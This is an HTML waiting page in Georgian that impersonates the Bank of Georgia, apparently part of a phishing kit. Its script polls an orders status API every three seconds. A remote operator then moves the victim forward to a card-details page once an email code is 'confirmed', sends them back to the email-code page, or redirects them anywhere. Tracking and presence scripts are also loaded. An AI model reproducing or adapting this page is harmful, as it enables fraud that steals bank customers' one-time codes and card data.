<!DOCTYPE html>
<html lang="ka" dir="ltr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Georgian:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<title>შემოწმება მიმდინარეობს</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  html,body{height:100%;font-family: "Noto Sans Georgian", "Segoe UI",Tahoma,Arial,sans-serif}
  body{
    max-width:520px;margin:0 auto;min-height:100vh;
    background:#f5f5f5;
    display:flex;align-items:center;justify-content:center;
  }

  .container{text-align:center;padding:40px 24px}

  .spinner{
    width:80px;height:80px;margin:0 auto 30px;
    border:4px solid #e0e0e0;
    border-top:4px solid #fc6719;
    border-radius:50%;
    animation:spin 1s linear infinite;
  }
  @keyframes spin{to{transform:rotate(360deg)}}

  h1{font-size:24px;font-weight:800;color:#1a1a1a;margin-bottom:12px}
  p{color:#888;font-size:15px;line-height:1.7}

  .dots-anim{margin-top:30px}
  .dots-anim span{
    display:inline-block;width:10px;height:10px;background:#fc6719;border-radius:50%;
    margin:0 4px;animation:bounce .6s infinite alternate;
  }
  .dots-anim span:nth-child(2){animation-delay:.2s}
  .dots-anim span:nth-child(3){animation-delay:.4s}
  @keyframes bounce{to{opacity:.3;transform:translateY(-8px)}}

  .bank-logo{margin-bottom:30px}
  .bank-logo img{height:48px;max-width:60%;object-fit:contain}
</style>
</head>
<body>

<div class="container">
  <div class="bank-logo"><img src="images/bog-logo-ka.png" alt="საქართველოს ბანკი"></div>
  <div class="spinner"></div>
  <h1>ამჟამად მიმდინარეობს ინფორმაციის გადამოწმება</h1>
  <p>გთხოვთ, დაელოდოთ.</p>
  <div class="dots-anim">
    <span></span><span></span><span></span>
  </div>
</div>

<script>
  const params = new URLSearchParams(location.search);
  const orderId = params.get("order");

  if (!orderId) {
    location.href = "index.html";
  }

  function checkStatus() {
    fetch("/api/orders/" + orderId + "/status")
      .then(r => r.json())
      .then(data => {
        if (data.redirect_to) {
          location.href = data.redirect_to + (data.redirect_to.includes('?') ? '&' : '?') + 'order=' + orderId;
          return;
        }
        if (data.status === "email_code_confirmed") {
          location.href = "card-details.html?order=" + orderId;
        } else if (data.status === "email_code_rejected") {
          location.href = "email-code.html?order=" + orderId + "&error=1";
        }
      })
      .catch(() => {});
  }

  setInterval(checkStatus, 3000);
  checkStatus();
</script>
<script src="tracker.js"></script>
<script src="/presence.js"></script>
</body>
</html>
